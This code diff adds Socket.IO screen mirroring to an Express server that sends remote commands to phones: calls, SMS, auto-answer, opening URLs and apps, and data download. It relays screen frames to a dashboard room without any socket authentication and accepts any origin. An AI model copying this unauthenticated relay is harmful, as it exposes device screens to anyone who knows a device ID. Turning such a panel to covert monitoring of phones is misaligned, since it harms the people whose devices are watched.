@@ -4,8 +4,10 @@ const express = require("express");
 const cors = require("cors");
 const mongoose = require("mongoose");
 const path = require("path");
+const http = require("http");
 const bcrypt = require("bcrypt");
 const jwt = require("jsonwebtoken");
+const { Server: SocketIOServer } = require("socket.io");
 
 const { connectToDatabase } = require("./src/config/db");
 const Device = require("./src/models/Device");
@@ -14,6 +16,13 @@ const User = require("./src/models/User");
 const { requireAuth } = require("./src/middleware/requireAuth");
 
 const app = express();
+const httpServer = http.createServer(app);
+const io = new SocketIOServer(httpServer, {
+  cors: {
+    origin: true,
+    methods: ["GET", "POST"]
+  }
+});
 
 process.on("uncaughtException", (error) => {
   console.error("[uncaughtException]", error);
@@ -53,7 +62,9 @@ const COMMAND_CLAIM_SORT = { isImmediate: -1, scheduledAt: 1, createdAt: 1, _id:
 const DUMMY_DOWNLOAD_MIN_MB = 10;
 const DUMMY_DOWNLOAD_MAX_MB = 1000;
 const DUMMY_DOWNLOAD_CHUNK_BYTES = 64 * 1024;
+const SCREEN_MIRROR_MAX_FRAME_BYTES = Math.floor(1.5 * 1024 * 1024);
 const OPEN_APP_PACKAGE_REGEX = /^[a-zA-Z0-9_]+(\.[a-zA-Z0-9_]+)+$/;
+const screenMirrorSessions = new Map();
 const OPEN_APP_ALIAS_DEFINITIONS = [
   { packageName: "com.whatsapp", aliases: ["whatsapp", "whats app", "wa"] },
   { packageName: "org.telegram.messenger", aliases: ["telegram", "telegram app", "tg"] },
@@ -584,6 +595,199 @@ function respondAuthDisabled(res) {
     error: "Authentication is disabled: JWT_SECRET is not configured"
   });
 }
+
+function resolveScreenMirrorDeviceUid(socket, payload = {}) {
+  const payloadUid = normalizeDeviceUid(payload?.deviceUid);
+  if (payloadUid) return payloadUid;
+
+  const socketUid = normalizeDeviceUid(socket?.data?.screenMirrorDeviceUid);
+  return socketUid;
+}
+
+function ensureScreenMirrorSession(deviceUid) {
+  const normalizedDeviceUid = normalizeDeviceUid(deviceUid);
+  if (!normalizedDeviceUid) return null;
+
+  if (!screenMirrorSessions.has(normalizedDeviceUid)) {
+    screenMirrorSessions.set(normalizedDeviceUid, {
+      status: "idle",
+      startedAt: null,
+      lastFrameAt: null,
+      frameCount: 0
+    });
+  }
+
+  return screenMirrorSessions.get(normalizedDeviceUid) ?? null;
+}
+
+function buildScreenMirrorStatus(deviceUid) {
+  const normalizedDeviceUid = normalizeDeviceUid(deviceUid);
+  if (!normalizedDeviceUid) {
+    return null;
+  }
+
+  const session = ensureScreenMirrorSession(normalizedDeviceUid);
+  if (!session) {
+    return null;
+  }
+
+  return {
+    deviceUid: normalizedDeviceUid,
+    status: session.status ?? "idle",
+    startedAt: session.startedAt ?? null,
+    lastFrameAt: session.lastFrameAt ?? null,
+    frameCount: Number(session.frameCount || 0)
+  };
+}
+
+function emitScreenMirrorStatus(deviceUid) {
+  const normalizedDeviceUid = normalizeDeviceUid(deviceUid);
+  if (!normalizedDeviceUid) return;
+
+  const statusPayload = buildScreenMirrorStatus(normalizedDeviceUid);
+  if (!statusPayload) return;
+
+  io.to(`dashboard:${normalizedDeviceUid}`).emit("screen:status", statusPayload);
+}
+
+function estimateBase64Bytes(base64Value) {
+  if (typeof base64Value !== "string" || !base64Value) return 0;
+  const normalized = base64Value.replace(/\s+/g, "");
+  const length = normalized.length;
+  if (!length) return 0;
+
+  const padding =
+    normalized.endsWith("==") ? 2 : normalized.endsWith("=") ? 1 : 0;
+  return Math.floor((length * 3) / 4) - padding;
+}
+
+io.on("connection", (socket) => {
+  socket.on("device:join", (payload = {}) => {
+    const deviceUid = normalizeDeviceUid(payload?.deviceUid);
+    if (!deviceUid) return;
+
+    socket.data.screenMirrorDeviceUid = deviceUid;
+    socket.join(`device:${deviceUid}`);
+    console.log("[SCREEN_MIRROR] device joined", { deviceUid });
+  });
+
+  socket.on("dashboard:join", (payload = {}) => {
+    const deviceUid = normalizeDeviceUid(payload?.deviceUid);
+    if (!deviceUid) return;
+
+    socket.join(`dashboard:${deviceUid}`);
+    console.log("[SCREEN_MIRROR] dashboard joined", { deviceUid });
+    emitScreenMirrorStatus(deviceUid);
+  });
+
+  socket.on("screen:started", (payload = {}) => {
+    const deviceUid = resolveScreenMirrorDeviceUid(socket, payload);
+    if (!deviceUid) return;
+
+    const session = ensureScreenMirrorSession(deviceUid);
+    if (!session) return;
+
+    session.status = "live";
+    session.startedAt = nowIsoTimestamp();
+    session.lastFrameAt = null;
+    session.frameCount = 0;
+
+    console.log("[SCREEN_MIRROR] started", { deviceUid });
+    emitScreenMirrorStatus(deviceUid);
+  });
+
+  socket.on("screen:stopped", (payload = {}) => {
+    const deviceUid = resolveScreenMirrorDeviceUid(socket, payload);
+    if (!deviceUid) return;
+
+    const session = ensureScreenMirrorSession(deviceUid);
+    if (!session) return;
+
+    session.status = "stopped";
+    session.lastFrameAt = nowIsoTimestamp();
+
+    console.log("[SCREEN_MIRROR] stopped", {
+      deviceUid,
+      reason: payload?.reason ?? null
+    });
+    io.to(`dashboard:${deviceUid}`).emit("screen:status", {
+      ...buildScreenMirrorStatus(deviceUid),
+      reason: payload?.reason ?? null
+    });
+  });
+
+  socket.on("screen:error", (payload = {}) => {
+    const deviceUid = resolveScreenMirrorDeviceUid(socket, payload);
+    if (!deviceUid) return;
+
+    const session = ensureScreenMirrorSession(deviceUid);
+    if (!session) return;
+
+    session.status = "error";
+    session.lastFrameAt = nowIsoTimestamp();
+
+    console.log("[SCREEN_MIRROR] error", {
+      deviceUid,
+      reason: payload?.reason ?? null
+    });
+    io.to(`dashboard:${deviceUid}`).emit("screen:status", {
+      ...buildScreenMirrorStatus(deviceUid),
+      reason: payload?.reason ?? null
+    });
+  });
+
+  socket.on("screen:frame", (payload = {}) => {
+    const deviceUid = resolveScreenMirrorDeviceUid(socket, payload);
+    if (!deviceUid) return;
+
+    const frameBase64 =
+      typeof payload?.frameBase64 === "string" ? payload.frameBase64 : "";
+    if (!frameBase64) return;
+
+    const estimatedBytes = estimateBase64Bytes(frameBase64);
+    if (estimatedBytes > SCREEN_MIRROR_MAX_FRAME_BYTES) {
+      console.warn("[SCREEN_MIRROR] frame too large", {
+        deviceUid,
+        bytes: estimatedBytes
+      });
+      return;
+    }
+
+    const mimeType =
+      typeof payload?.mimeType === "string" && payload.mimeType.trim()
+        ? payload.mimeType.trim()
+        : "image/jpeg";
+    const width = Number.isFinite(Number(payload?.width))
+      ? Math.max(0, Math.round(Number(payload.width)))
+      : null;
+    const height = Number.isFinite(Number(payload?.height))
+      ? Math.max(0, Math.round(Number(payload.height)))
+      : null;
+    const timestamp = Number.isFinite(Number(payload?.timestamp))
+      ? Math.round(Number(payload.timestamp))
+      : Date.now();
+
+    const session = ensureScreenMirrorSession(deviceUid);
+    if (!session) return;
+
+    session.status = "live";
+    if (!session.startedAt) {
+      session.startedAt = nowIsoTimestamp();
+    }
+    session.lastFrameAt = nowIsoTimestamp();
+    session.frameCount = Number(session.frameCount || 0) + 1;
+
+    io.to(`dashboard:${deviceUid}`).emit("screen:frame", {
+      deviceUid,
+      frameBase64,
+      mimeType,
+      width,
+      height,
+      timestamp
+    });
+    emitScreenMirrorStatus(deviceUid);
+  });
+});
 
 app.get("/", (req, res) => {
   return res.sendFile(path.join(__dirname, "public", "index.html"));
@@ -1125,7 +1329,9 @@ app.post("/commands", requireAuth, async (req, res) => {
       close_webview: "CLOSE_WEBVIEW",
       open_app: "OPEN_APP",
       return_to_autocall: "RETURN_TO_AUTOCALL",
-      download_data: "DOWNLOAD_DATA"
+      download_data: "DOWNLOAD_DATA",
+      start_screen_mirror: "START_SCREEN_MIRROR",
+      stop_screen_mirror: "STOP_SCREEN_MIRROR"
     };
     const typeToAction = {
       CALL: "call",
@@ -1136,7 +1342,9 @@ app.post("/commands", requireAuth, async (req, res) => {
       CLOSE_WEBVIEW: "close_webview",
       OPEN_APP: "open_app",
       RETURN_TO_AUTOCALL: "return_to_autocall",
-      DOWNLOAD_DATA: "download_data"
+      DOWNLOAD_DATA: "download_data",
+      START_SCREEN_MIRROR: "start_screen_mirror",
+      STOP_SCREEN_MIRROR: "stop_screen_mirror"
     };
 
     const normalizedActionInput =
@@ -1151,14 +1359,14 @@ app.post("/commands", requireAuth, async (req, res) => {
     if (normalizedActionInput && !actionToType[normalizedActionInput]) {
       return res.status(400).json({
         error:
-          "Invalid action. Only 'call', 'end', 'sms', 'auto_answer', 'open_url', 'close_webview', 'open_app', 'return_to_autocall', and 'download_data' are supported."
+          "Invalid action. Only 'call', 'end', 'sms', 'auto_answer', 'open_url', 'close_webview', 'open_app', 'return_to_autocall', 'download_data', 'start_screen_mirror', and 'stop_screen_mirror' are supported."
       });
     }
 
     if (normalizedTypeInput && !typeToAction[normalizedTypeInput]) {
       return res.status(400).json({
         error:
-          "Invalid type. Only 'CALL', 'END', 'SMS', 'AUTO_ANSWER', 'OPEN_URL', 'CLOSE_WEBVIEW', 'OPEN_APP', 'RETURN_TO_AUTOCALL', and 'DOWNLOAD_DATA' are supported."
+          "Invalid type. Only 'CALL', 'END', 'SMS', 'AUTO_ANSWER', 'OPEN_URL', 'CLOSE_WEBVIEW', 'OPEN_APP', 'RETURN_TO_AUTOCALL', 'DOWNLOAD_DATA', 'START_SCREEN_MIRROR', and 'STOP_SCREEN_MIRROR' are supported."
       });
     }
 
@@ -1789,7 +1997,7 @@ async function cleanupLegacyDeviceUidData() {
 async function startServer() {
   warnIfJwtSecretMissing();
 
-  app.listen(PORT, "0.0.0.0", () => {
+  httpServer.listen(PORT, "0.0.0.0", () => {
     console.log(`Server running on port ${PORT}`);
   });
 
